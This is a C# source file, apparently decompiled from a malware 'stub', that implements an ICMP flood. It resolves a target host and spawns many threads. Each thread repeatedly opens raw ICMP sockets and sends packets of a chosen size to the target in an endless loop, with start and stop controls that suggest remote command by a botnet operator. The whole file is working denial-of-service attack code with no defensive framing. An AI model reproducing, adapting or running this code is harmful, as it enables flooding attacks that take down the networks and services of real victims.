namespace Stub
{
    using System;
    using System.Net;
    using System.Net.Sockets;
    using System.Threading;

    internal class IcmpFlood
    {
        private static ThreadStart[] FloodingJob;
        private static Thread[] FloodingThread;
        public static string Host;
        public static int IcmpSockets;
        private static IPEndPoint ipEo;
        public static int Port;
        public static int pSize;
        private static SendIcmp[] SynClass;
        public static int Threads;

        public static void StartIcmpFlood()
        {
            try
            {
                ipEo = new IPEndPoint(Dns.GetHostEntry(Host).AddressList[0], Port);
            }
            catch
            {
                ipEo = new IPEndPoint(IPAddress.Parse(Host), Port);
            }
            FloodingThread = new Thread[Threads];
            FloodingJob = new ThreadStart[Threads];
            SynClass = new SendIcmp[Threads];
            for (int i = 0; i < Threads; i++)
            {
                SynClass[i] = new SendIcmp(ipEo, IcmpSockets, pSize);
                FloodingJob[i] = new ThreadStart(SynClass[i].Send);
                FloodingThread[i] = new Thread(FloodingJob[i]);
                FloodingThread[i].Start();
            }
        }

        public static void StopIcmpFlood()
        {
            for (int i = 0; i < Threads; i++)
            {
                try
                {
                    FloodingThread[i].Suspend();
                }
                catch
                {
                }
            }
        }

        private class SendIcmp
        {
            private int IcmpSockets;
            private IPEndPoint ipEo;
            private int pSize;
            private Socket[] Sock;

            public SendIcmp(IPEndPoint ipEo, int SynSockets, int pSize)
            {
                this.ipEo = ipEo;
                this.IcmpSockets = SynSockets;
                this.pSize = pSize;
            }

            public void Send()
            {
                int num;
                byte[] buffer;
            Label_0000:
                buffer = new byte[this.pSize];
                try
                {
                    this.Sock = new Socket[this.IcmpSockets];
                    for (num = 0; num < this.IcmpSockets; num++)
                    {
                        this.Sock[num] = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
                        this.Sock[num].Blocking = false;
                        this.Sock[num].SendTo(buffer, this.ipEo);
                    }
                    Thread.Sleep(100);
                    for (num = 0; num < this.IcmpSockets; num++)
                    {
                        if (this.Sock[num].Connected)
                        {
                            this.Sock[num].Disconnect(false);
                        }
                        this.Sock[num].Close();
                        this.Sock[num] = null;
                    }
                    this.Sock = null;
                    goto Label_0000;
                }
                catch
                {
                    for (num = 0; num < this.IcmpSockets; num++)
                    {
                        try
                        {
                            if (this.Sock[num].Connected)
                            {
                                this.Sock[num].Disconnect(false);
                            }
                            this.Sock[num].Close();
                            this.Sock[num] = null;
                        }
                        catch
                        {
                        }
                    }
                    goto Label_0000;
                }
            }
        }
    }
}

